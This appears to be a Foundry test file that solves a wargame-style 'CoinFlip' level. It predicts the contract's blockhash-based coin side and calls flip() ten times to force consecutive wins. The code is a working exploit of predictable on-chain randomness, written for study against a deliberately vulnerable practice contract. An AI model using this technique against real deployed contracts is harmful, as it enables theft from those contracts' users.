// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {CoinFlip} from "../src/3.CoinFlip.sol";
contract CoinFlipHackTest is Test {
    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function setUp() public {
        coinFlip = new CoinFlip();
    }
    function hack() internal {
        uint256 blockNumber = 1641070800;
        uint256 winCount;
        while(winCount < 10){
            vm.roll(blockNumber);
            uint256 blockValue = uint256(blockhash(blockNumber - 1));
            uint256 coinFlipValue = blockValue / FACTOR; 
            bool side = coinFlipValue == 1 ? true : false;
            bool r = coinFlip.flip(side);
            console.log(blockNumber, r);
            winCount++;
            blockNumber++;
        }
    }
    function testCoinFlip() public {
        hack();
        assertEq(coinFlip.consecutiveWins(), 10);
    }
}